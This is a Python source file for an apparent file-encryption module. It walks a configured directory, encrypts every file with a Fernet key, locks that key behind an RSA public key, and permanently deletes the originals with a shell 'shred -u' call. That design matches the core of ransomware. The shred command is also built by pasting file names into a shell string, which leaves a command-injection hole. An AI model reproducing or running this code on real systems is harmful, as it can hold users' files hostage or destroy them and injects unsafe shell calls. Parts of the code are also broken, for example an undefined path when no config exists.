from cryptography.fernet import Fernet
import os
from Crypto.PublicKey import RSA
class encryption_module:

	def __encrypt(self,key,data):
		f = Fernet(key)
		token = f.encrypt(data)
		return token

	def __decrypt(self,key,encrypted_data):
		f = Fernet(key)
		token = f.decrypt(encrypted_data)
		return (token)
	def __init__(self):
		self.encryption_mode =1
		self.decryption_mode =0
		if os.path.exists('./Config'):
			with open("./Config") as config:
				lineslist = config.readlines()
				path = lineslist[0].split(':')[1][:-1]
				password = lineslist[1].split(':')[1][:-1]
				#self.configEnc(self.encryption_mode)

		self.path = path 
		#generate_key
		'''if(os.path.isfile("password") == False):
			
			key = Fernet.generate_key()
			key_file = open("password","wb")
			key_file.write(key)
			key_file.close()'''

			
	'''def configEnc(self,mode):
		key_file = open("password","rb")
		key_file.seek(0)
		key = key_file.read()
		key_file.close()
		fileOB = open("Config","rb+")
		if(mode ==self.encryption_mode):
			data= self.__encrypt(key,fileOB.read())#key_file - key for encryption
		elif(mode ==self.decryption_mode):
			data=self.__decrypt(key,fileOB.read())
		new_file= open("./Config"+"1","wb")	
		new_file.write(data)				
		fileOB.close()
		os.system("shred -u ./Config")
		os.rename("./Config"+"1","./Config")
		new_file.close()'''

	def do_encrypt(self,mode):
		
		if not os.path.exists(self.path):
			print ("path not exists")
			exit(0)
	
		'''key_file = open("password","rb")
		key_file.seek(0)
		key = key_file.read()'''
		key = Fernet.generate_key()
		for dirpath, dirnames, filenames in os.walk(self.path):
			for name in filenames:
				
				file_path= dirpath + "/" + name
				if os.path.isfile(file_path):
					fileOB = open(file_path,"rb+")
					fileOB.seek(0)
					if(mode ==self.encryption_mode):
						
						data= self.__encrypt(key,fileOB.read())#key_file - key for encryption
						with open("public.pem") as pub_file:
							public_key = RSA.importKey(pub_file.read())
							

							key_file = open("password","wb")
							
							key_file.write(public_key.encrypt(key,K = b'sdasdqweasd')[0])
							key_file.close()
							
							
					elif(mode ==self.decryption_mode):
							
						with open("private.pem") as priv_file:
							
							priv_key = RSA.importKey(priv_file.read())
							key_file = open("password","rb")
							
							EncryptedAES = key_file.read()#the opened file contains
							key = priv_key.decrypt(EncryptedAES) 
							data=self.__decrypt(key,fileOB.read())
							
						
					new_file= open(file_path+"1","wb")	
					new_file.write(data)				
					fileOB.close()
					os.system("shred -u "+"\""+file_path+"\"")
					os.rename(file_path+"1",file_path)

					new_file.close()
								
		key_file.close()

	


	


